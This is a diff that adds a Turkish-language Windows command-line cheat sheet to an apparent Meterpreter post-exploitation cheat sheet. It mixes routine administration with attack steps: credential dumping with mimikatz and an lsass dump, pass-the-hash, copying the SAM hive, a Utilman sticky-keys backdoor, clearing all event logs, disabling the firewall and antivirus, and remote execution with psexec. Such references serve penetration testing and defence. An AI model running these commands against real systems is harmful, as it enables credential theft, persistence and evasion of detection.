@@ -203,3 +203,353 @@ Drop to a Windows shell		meterpreter > shell
 				C:\> whoami
 Add user to the domain		C:\> net user hacker /add /domain
 Add user to security group	C:\> net group "Domain Admins" hacker /add /domain
+
+==========================================
+
+Kullanıcı ve Grup İşlemleri >Yerel bilgisayarda kullanıcı işlemleri
+
+	* whoami
+	* echo %username%
+	* echo %computername%%username%
+	* whoami /all
+	* net user
+	* net user Ali
+	* net user Ali /Active:Yes
+	* net user Ali Aa123456
+	* net user Ali /del
+	* net user Burak Bb123456 /add
+
+ 
+Yerel bilgisayarda grup işlemleri
+
+	* net localgroup
+	* net localgroup “Remote Desktop Users”
+	* net localgroup “Sistem Yoneticileri” /add
+	* net localgroup “Sistem Yoneticileri” /del
+	* net localgroup Administrators Burak /add
+	* net localgroup Users Burak /del
+
+ 
+Etki alanındaki kullanıcı işlemleri
+
+	* net user /domain
+	* net user Cihan.Ozgullu /domain
+	* net user Cihan.Ozgullu /Active:Yes /domain
+	* net user Cihan.Ozgullu Cc123456 /domain
+	* net user Cihan.Ozgullu /del /domain
+	* net user Deniz.Kirmizili Dd123456 /add /domain
+
+ 
+Etki alanındaki grup işlemleri
+
+	* net group /domain
+	* dsquery group -limit 0 | dsget group -members –expand
+	* net group “Domain Computers” /domain
+	* net group “Yardim Masasi” /add /domain
+	* net group “Yardim Masasi” /del /domain
+	* net group “Domain Admins” Cihan.Ozgullu /add /domain
+	* net group “Domain Users” Deniz.Kirmizili /del /domain
+	* for /f “delims=” %X in (DomainAdminsGrubuUyeleri_Listesi.txt) do net user %X /domain >> DomainAdminsGrubuUyelerininIlkeBilgileri.txt
+
+Not: Girdi dosyasında (DomainAdminsGrubuUyeleri_Listesi.txt), kullanıcı isimleri alt alta yazılıdır.
+Bilgisayar İşlemleri >Mevcut sistem bilgileri
+
+	* systeminfo
+	* ver
+	* echo %LOGONSERVER%
+	* systeminfo | findstr “Domain:”
+	* fsutil fsinfo drives
+	* net view
+	* net config WORKSTATION
+	* getmac
+
+ 
+Başlangıç dizinleri
+
+	* Windows 6.0 ve 6.1
+	* 
+		* Tüm kullanıcılar için: %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+		* Belirli kullanıcılar için: %SystemDrive%\Users\%UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+	* Windows NT 5.0, 5.1 ve 5.2
+	* 
+		* %SystemDrive%\Documents and Settings\ All Users\ Start Menu\Programs\Startup
+
+
+ 
+Hesap politikası işlemleri
+
+	* net accounts
+	* net accounts /MAXPWAGE:3
+
+ 
+Denetim politikası işlemleri
+
+	* auditpol /get /category:*
+	* auditpol /set /subcategory:”IPsec Driver” /success:enable /failure:disable
+
+ 
+Paylaşım işlemleri
+
+	* net share
+	* net share YeniPaylasim=C:UsersDeneme /GRANT:Everyone,Full
+
+ 
+Oturum bilgileri
+
+	* query session
+	* qwinsta
+	* psloggedon -l Ertan
+	* Get-WmiObject -Class Win32_NetworkLoginProfile | Sort-Object -Property LastLogon -Descending | Select-Object -Property * -First 1 | Where-Object {$_.LastLogon -match “(d{14})”} | Foreach-Object { New-Object PSObject -Property @{ Name=$_.Name;LastLogon=[datetime]::ParseExact($matches[0], “yyyyMMddHHmmss”, $null)}}
+
+ 
+Proses işlemleri
+
+	* tasklist /v
+	* tasklist /SVC | findstr /I “explorer.exe”
+	* tasklist /fi “pid eq 460”
+	* wmic process where (executablepath like “%system32%” and name!=”svchost.exe” or Priority = “8” ) get HandleCount, Name, ParentProcessId, Priority, ProcessId, ThreadCount /Every:3 > CalisanProseslerinDetaylari.txt
+	* taskkill /F /T /IM filezillaftp.exe
+	* taskkill /PID 1862 /F
+	* qprocess explorer.exe
+	* qprocess akif.cihangir
+	* wmic process call create calc
+	* wmic process where name=”calc.exe” call terminate
+
+ 
+Kayıt değeri işlemleri
+
+	* reg query HKLM\System\CurrentControlSet\Control\Lsa /v crashonauditfail
+	* reg query “HKCU\Software\SimonTatham\PuTTY\Sessions\PuttyUzerindeKayitliOturumAdi” /v Hostname
+	* reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 1 /f
+	* reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber /t REG_DWORD /d 12345 /f
+	* reg save HKLM\SAM C:\SAMDosyasi
+	* reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe” /v Debugger /t REG_SZ /d “C:\Windows\System32\cmd.exe” /f
+	* reg export “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” Sonuc.reg
+	* reg import Sonuc.reg
+
+ 
+Ağ hareketleri
+
+	* netstat -ano
+	* netstat -ano -p TCP | findstr 3389 | findstr /v 0.0.0.0:3389
+	* netstat -abf
+
+ 
+Yönlendirme işlemleri
+
+	* netstat -r
+	* route print -4
+	* route add 192.168.10.0 MASK 255.255.255.0 192.168.10.1
+	* route del 192.168.10.0
+
+ 
+Kablosuz ağ işlemleri
+
+	* netsh wlan show profiles
+	* netsh wlan show profile name=ModemSSID
+	* netsh wlan show profile name=ModemSSID key=clear | findstr “Key Content”
+	* Dosya dizini: C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\XXX
+
+ 
+Ağ işlemleri
+
+	* ipconfig /all
+	* arp -a
+	* nslookup www.hotmail.com 8.8.8.8
+	* tftp -I 192.168.64.26 GET Uygulama.exe
+	* netsh interface ipv4 set address name=”Local Area Connection” source=static address=10.12.40.110 mask=255.255.255.0 gateway=10.12.40.1
+	* netsh interface ipv4 add dnsservers “Local Area Connection” 172.19.35.80
+	* netsh interface portproxy add v4tov4 listenport=3000 listenaddress=1.1.1.1 connectport=4000 connectaddress=2.2.2.2
+	* type C:\Windows\System32\Drivers\etc\hosts
+
+ 
+DNS bilgileri
+
+	* ipconfig /displaydns
+	* ipconfig /flushdns
+
+ 
+Dosya ve klasör işlemleri
+
+	* dir /a C:\Users\Mehmet\Downloads\*.pdf
+	* tree /f /a
+	* dir /s /b
+	* findstr /si “parola sifre password root admin”
+	* icalcs C:\Users\Ahmet\Desktop\KritikKlasor –> icalcs: Sysinternals aracı
+	* forfiles /P d: /D -30 /S /M *.exe /C “cmd /c echo @path @ext @fname @fdate”
+	* Get-ChildItem -Path C:\Users, C:\Araclar -Include *.txt, *.log, *.bat, *.reg, *.cs, *.sql, *.ps1, *.config, *.properties, *.xml, *.conf -Recurse -ErrorAction SilentlyContinue -Force | Select-String -Pattern Password, password, Şifre, şifre, Parola, parola, Sifre, sifre, root, admin -casesensitive > C:\KritikBilgiler.txt
+
+ 
+Zamanlanmış görevler
+
+	* schtasks /query /fo LIST /v | findstr “Folder: HostName: Author: Run: TaskName: Comment:”
+	* schtasks /Create /SC Daily /TN GunlukKullaniciListesi /TR “C:\Windows\System32\net.exe user”
+	* at /interactive 15:00 cmd.exe
+	* net time
+
+ 
+Servis işlemleri
+
+	* sc query state= all
+	* sc queryex (PID değeri de içerir)
+	* sc qc TermService
+	* accesschk -cqwvu TrustedInstaller –> accesschk: Sysinternals aracı
+	* wmic service get name, displayname, started, state, AcceptPause, AcceptStop | findstr /C:Term
+	* net stop PolicyAgent
+	* net start termservice start= auto
+	* sc config PlugPlay start= disabled
+	* sc create ServisAdi binpath=C:\Users\UygulamaDosyasi.exe start= auto
+
+Not: Power, PlugPlay gibi kapatılamayan servisler devre dış bırakılıp, makine yeniden başlatılırsa bu servis çalışmaz.
+ 
+Güvenlik duvarı işlemleri
+
+	* netsh firewall set service remotedesktop enable
+	* netsh firewall show opmode
+	* netsh firewall add portopening TCP 12345 “12345 Portunu Acan Kural” Enable All
+	* netsh firewall show portopening
+	* netsh advfirewall show allprofiles
+	* netsh advfirewall set allprofiles state off
+	* netsh advfirewall set currentprofile state off
+	* netsh firewall set logging droppedpackets = enable
+	* netsh firewall set logging connections = enable
+	* Logların düştüğü dizin: %systemroot%System32LogFilesFirewallpfirewall.log
+
+ 
+Programlar ve özellikler
+
+	* wmic product get name
+	* wmic product where name=”Kaspersky Internet Security” call uninstall /nointeractive
+	* Dism.exe /online /Get-Features /Format:Table
+	* Dism.exe /online /Enable-Feature /Featurename:TFTP
+	* pkgmgr /iu:”TelnetClient”
+
+ 
+Başlangıç programları
+
+	* wmic startup get name, user, location
+
+ 
+Güncelleme işlemleri
+
+	* wusa /uninstall /kb:2744842 /quiet /norestart
+	* wmic qfe where HotFixID=”KB3011780″ get Caption, HotFixID
+
+ 
+Log işlemleri
+
+	* wevtutil qe Application /c:10 /rd:true /f:text
+	* for /F “tokens=*” %G in (‘wevtutil.exe el’) DO (wevtutil.exe cl “%G”)
+
+ 
+Başka bir kullanici gibi komut çalıştırma
+
+	* runas /env /user:SIRKET\Levent.Altayli cmd
+	* psexec -s cmd.exe
+
+ 
+Oturumu kilitleme
+
+	* rundll32.exe user32.dll, LockWorkStation
+
+ 
+Dosya kopyalama
+
+	* copy D:\netcat.exe C:\Users
+
+ 
+Parolaları RAM üzerinden elde etme
+
+	* mimikatz > privilege::debug > sekurlsa::logonPasswords
+	* mimikatz “sekurlsa::logonPasswords full” exit
+	* procdump -accepteula -ma lsass.exe lsass.dmp
+	* mimikatz > sekurlsa::minidump lsass.dmp > sekurlsa::logonPasswords
+	* wce -w
+	* wce -s WORKGROUP:Administrator:<LM>:<NTLM>
+
+ 
+Grup ilkesi işlemleri
+
+	* gpupdate /force
+	* gpresult /z
+	* gpresult /H Politika.html
+	* gpresult /USER Ferdi.Murathan /SCOPE COMPUTER /Z
+
+ 
+Posta işlemleri
+
+	* dsquery user -name “user name”|dsget user -samid -email -display
+	* Get-Mailbox | fl name, emailaddresses
+	* Get-QADUser -SizeLimit 0 -Enabled -Email * | Select-Object DisplayName,Email
+
+ 
+Etki alanı güven ilişkileri
+
+	* nltest /domain_trusts –> Tüm güven ilişkilerini listeler
+	* nltest /dcname:Sirket –> Belli bir etki alanındaki PDC sunucusunu sorgular.
+	* ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).Domains –> Forest (Orman) içerisindeki tüm etki alanları listelenir.
+	* ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() –> Mevcut etki alanı için tüm güven ilişkileri (Parent-Child, 2 yönlü vs) listelenir.
+
+ 
+Oturum açan etki alanı hesabının bilgileri
+
+	* Get-EventLog security 4624 -newest 10000 | Where-Object{$_.Message -like ‘*Galip.Tekinli*’}| format-list Message > GalipTekinliHesabininActigiOturumBilgileri.txt
+
+Not: Belirtilen komut etki alanı denetleyicisinde (DC) çalıştırılmalıdır.
+ 
+Diğer komutlar
+
+	* shutdown /r /t 0 /f
+
+ 
+Uzak Bilgisayar İşlemleri >Uzak bilgisayar için sistem bilgileri
+
+	* psinfo \\172.16.4.230 -h -s -d
+	* systeminfo /S 10.35.2.52 /U Ornek\Murat /P Aa123456
+
+ 
+Uzak bilgisayarın paylaşımına erişim
+
+	* net use K: \\172.24.63.135\C$ /USER:SIRKET\Hakki.Leventli Hh123456
+	* net use K: /delete
+
+ 
+Uzak bilgisayarın komut satırına erişim
+
+	* psexec \\172.16.4.230 -u SIRKETHakki.Leventli -p Hh123456 cmd.exe /accepteula
+	* psexec \\172.16.4.230 -u SIRKETHakki.Leventli -p Hh123456 -c -f \\172.29.26.152\Paylasim\Uygulama.exe
+
+ 
+Uzaktaki bilgisayarda çalışan prosesler
+
+	* tasklist /V /S 172.16.72.129 /U SIRKETVeli.Kut /P 1907?Fenerbahce
+
+ 
+Uzak bilgisayardaki kayıt değerleri
+
+	* reg query “\\192.168.170.62\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” /v Userinit
+
+ 
+Uzak bilgisayarda açık olan oturumlar
+
+	* query session /server:DCSunucusu
+	* reset session 3 /server:DCSunucusu
+
+ 
+Uzak bilgisayarda zamanlanmış görevler
+
+	* net time \\172.31.45.26
+	* at \\172.31.45.26 10:32 Betik.bat
+
+ 
+Uzak bilgisayardaki dizinin kopyalanması
+
+	* xcopy /s 10.46.83.183\PaylasimKlasoru C:\KopyalanacakDizin
+
+ 
+Diğer komutlar
+
+	* shutdown /m \\172.24.63.168 /r /t 10 /f /c “Bilgisayar 10 saniye icinde kapatiliyor…”
+
+
